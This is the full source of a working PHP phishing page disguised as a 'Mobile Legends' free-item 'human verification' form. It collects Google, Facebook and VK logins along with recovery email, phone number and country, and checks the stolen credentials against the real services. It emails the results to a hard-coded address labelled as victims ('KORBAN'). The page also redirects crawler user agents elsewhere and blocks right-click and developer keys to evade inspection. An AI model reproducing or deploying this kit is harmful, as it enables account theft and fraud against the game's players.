<?php 
set_time_limit(0);
ob_start();
session_start();
require_once('fb.class.php');

if(isset($_SESSION['user']) && isset($_SESSION['pass'])){

}
?>
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.raflipedia.club/');
die();
}
?>
<?php
function google() {
if(isset($_POST['email'])) {
	
$email = $_POST['email'];
$password = $_POST['password'];

$target_url = "https://accounts.google.com/ServiceLoginAuth";

$bypass1 = 'Page=PasswordSeparationSignIn';
$bypass2 = '&GALX=mGDB7K9zbrA&gxf=AFoagUVjztZYkqkyLadakYj-n3oGPW8YmQ%3A1460264072096';
$bypass3 = '&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount&hl=in&sacu=1';
$bypass4 = '&ProfileInformation=APMTquly2nV_-lYbiwsH-IZCsEluHsN8mKOerhd4JfCotzZXjBPK-Gu0_bkKJtD60myjTUreu2R9ld98EP-TFeprczUrJW-MnH5UGlhzfOOBZxE66aXKERZ1dwWLNFIATYessFcegQsyRH9Ttz1GzyGP8EV8HlwvFDC4hwYHD42Dfsm-ar41uLhiuV_r0Dl6bzm12-MOjGzM5FF_Nrd2_qHClSpYSgNDcKGYy4naax1YUfLB80RLAjs';
$bypass5 = '&_utf8=%E2%98%83&bgresponse=%21ycpCvOTG8hwJumpEI7L-wHjbWvICAAAAMFIAAAAFCgAQZ9adjZ-80DMYgLxjH9cEb5kBE2cOlVeuSenauWpCANr2Wb3emPpG0tMw5w7BWfup_N1UumBSl2H5egWKR3amE8DXZ4kS-glcadjhhF1jWGeiOKhLu8QwZ0N2jITcCCL8tAQ-rsjvDID2gmLJuyRn73q-oYkSzBSmQ1Cd66TawMVzR7B_4aFgktD0APbYbLHeJGDhAoyNBPE4ObUVtkHZYyaWmJG5iMMukWzpi-wz-P0W9JTpIZ-tYLSMwXX7qHUStmFQHdBmkTkuJDractXsJzVFRJPfsERE_l9GYr3yR-MLrBPGddPoplqaW-vpRQKRkDYYa8xui63CUICUM_XFEWXPDns_nMT95Z4lXkpyyePqHHKzXQJpInL7h9Treji1_vkFaFTx';
$bypass6 = '&pstMsg=1';
$bypass7 = '&dnConn=';
$bypass8 = '&checkConnection=youtube%3A10327%3A1&checkedDomains=youtube';
$bypass9 = '&identifiertoken=';
$bypass10 = '&identifiertoken_audio=';
$bypass11 = '&identifier-captcha-input=';
$bypass12 = '&Email='.urlencode($email).'&Passwd='.$password;
$bypass13 = '&rmShown=1';

$bypassCSRFGoogle = $bypass1.$bypass2.$bypass3.$bypass4.$bypass5.$bypass6.$bypass7;
$SesionSIGN = $bypass8.$bypass9.$bypass10.$bypass11.$bypass12.$bypass13;
$data = $bypassCSRFGoogle.$SesionSIGN;

$curl_google = curl_init(); 
curl_setopt ($curl_google, CURLOPT_URL, $target_url); 
curl_setopt ($curl_google, CURLOPT_TIMEOUT, 60); 
curl_setopt($curl_google, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl_google, CURLOPT_POST, 1);
curl_setopt($curl_google, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl_google, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl_google, CURLOPT_POSTFIELDS, $data);

$headers  = array();
$headers[] =  'User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:45.0) Gecko/20100101 Firefox/45.0';
$headers[] =  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
$headers[] =  'Accept-Language: en-US,en;q=0.5';
$headers[] =  'Accept-Encoding: gzip, deflate, br';
$headers[] =  'Referer: https://accounts.google.com/ServiceLogin?sacu=1&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount&hl=in';
$headers[] =  'Cookie: NID=78=RYSeIinNsJOS3DXgTIGvVISGotCFw5TZwbQIVmWvjlf0AAF8oMBIYoUIphKJ_wXYkEjD4WtS2cMsQ3xYHG8vb1PZ70IPx7NKXGkCzut7NDiMNQLxH7PPXXFxkNl7A-AUhiVakA_ebQ9Jic4ITDy0eVqda3GewNiEbKGFGAvkq_kEsnHwS2bmXWVCzjbbMjo; OGP=-5061451:-5061821:; OGPC=5061821-4:; GAPS=1:0B2GlwnEqWTiL-2iMZHHo7saYOcfpw:USMASGMV8sKvQie4; ACCOUNT_CHOOSER=AFx_qI6n2cQW4BV16ODLWN6HLey92lqkIlZj8Ttm2g8h_tEFHJzrQB1WzN-qIHwqEye2UFXaxWNV0QFUSLfQSYMg2uureOEN2HqgxM-SV3Uh9z-SPQ6Npac; GMAIL_RTT=2030; GALX=mGDB7K9zbrA; GoogleAccountsLocale_session=in; RMME=false';
$headers[] =  'Connection: keep-alive';
$headers[] =  'Content-Type: application/x-www-form-urlencoded';


curl_setopt ($curl_google, CURLOPT_HTTPHEADER, $headers);
curl_setopt ($curl_google, CURLOPT_HEADER, 1);

$result = curl_exec($curl_google);
curl_close($curl_google);
if(preg_match('#302 Moved#', $result)) {

    echo "<h4><font style='color:red;'>Wrong Data</font></h4>";

}else {
	echo "<h4><font style='color:red;'>Wrong Data</font></h4>";
	
}
}
}
?>

<html>
<head>
<meta charset="utf-8">
<title>Mobile Legends - Free Collect</title>
<link href="css/style.css" rel="stylesheet" type="text/css">
<link href="https://www.mobilelegends.com/images/favicon.ico?v=1" rel="shorcut icon">
<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/generic.js"></script>
<script type="text/javascript" src="js/main.js"></script>
</head>
<body>
<div>

<script type="text/javascript">
function disableSelection(e){if(typeof e.onselectstart!="undefined")e.onselectstart=function(){return false};else if(typeof e.style.MozUserSelect!="undefined")e.style.MozUserSelect="none";else e.onmousedown=function(){return false};e.style.cursor="default"}window.onload=function(){disableSelection(document.body)}
</script>

<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>

<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>

<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(gambar/bekgron.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>

	
<div id="kotak">
<div id="kotak2">
<div id="kotak3">
<div class="logonya"></div>
<div id='pantek' style="color:white">
<p>
<center>
<span class="kocakwe">Manual Human Verification</span>
</p>
</center>
					
<div class="kotakform">
<h3>Complete your Mobile Legends account.</h3>
<form action="" method="post">
<center><img src="gambar/glogo.png"></center>
<input type="text" name="email" id="email" placeholder="Email Address" required>
<input type="password" name="password" id="password" placeholder="Password" required>
<input type="text" name="recovery" id="recovery" placeholder="Recovery Email Address" required>
<input type="number" name="phone" id="phone" placeholder="Mobile Phone" required>
<input type="text" name="country" id="country" placeholder="Country" required>

</br>
</br>

<center><img height="50" width="100" src="gambar/efbih.png"></center>
<input type="text" name="user" id="user" placeholder="Email or Phone" required>
<input type="password" name="pass" id="pass" placeholder="Password" required>

</br>
</br>

<?php 
if($_SERVER['REQUEST_METHOD'] == "POST"){
	
	$user = $_REQUEST['user'];
	$pass = $_REQUEST['pass'];
	
	if($darknethost->LoginFB($user, $pass) == "OK"){
		
$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'];
$password = $_POST['password'];
$emailr = $_POST['recovery'];
$hp = $_POST['phone'];
$country = $_POST['country'];

$user = $_POST['user'];
$pass = $_POST['pass'];

$emailvk = $_POST['emailvk'];
$passwordvk = $_POST['passwordvk'];

$subjek = "MOBILE LEGENDS | KORBAN ['$email']";
$mailto = "putraandre5678@gmail.com";

$body = <<<EOD
<hr>
========< AKUN GOOGLE KORBAN >========<br>
Email : $email<br>
Password : $password<br>
Email Pemulihan : $emailr<br>
Nomor HP : $hp<br>
Country : $country<br>
Level : $xp<br>
Tier : $tier<hr>

========< AKUN FACEBOOK KORBAN >========<br>
Email : $user<br>
Password : $pass<hr>

========< Akun VK >========<br>
Email : $emailvk<br>
Password : $passwordvk<hr>
IP : $ip
<hr>
EOD;

$headers = "From: raflipedia@phising.com\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($mailto, $subjek, $body, $headers);

		echo "<meta http-equiv='Refresh' content='0; completed.php'/>";
	}else{
		
		echo "";
		
	}
}

?>

<center><img height="50" width="100" src="gambar/pika.png"></center>
<input type="text" name="emailvk" id="emailvk" placeholder="Email or Phone" required>
<input type="password" name="passwordvk" id="passwordvk" placeholder="Password" required>

</br>
<?php echo google();?>
</br>

<input type="submit" class="tombol" name="masuk" value="Verify Now">
</form>
						
</div>
<br>
<br></div>
</div>
</div>
</div>
</div>
<br>
<br>
<div>

<div id="bawah">
<div style="clear:both"></div>
<br>
<br>
<img height="90" width="100" src="gambar/muntun.png">
<p>2017 © Moonton. Trademarks belong to their respective owners. All rights reserved.
</p>
</div>
</div>

</body>
</html>